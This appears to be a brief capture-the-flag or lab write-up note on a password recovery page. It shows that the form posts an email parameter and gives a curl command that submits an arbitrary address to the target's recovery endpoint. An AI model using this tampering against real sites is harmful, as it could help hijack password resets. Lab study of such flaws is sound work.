The page recover (sign in --> forgot my password) there is a button that submit a recovery.

We can see a post method than specify the mail. 
We can do our own curl post method to test any email.

curl -X POST "http://<ip>/?page=recover" --data "mail=test@test.com&Submit=Submit"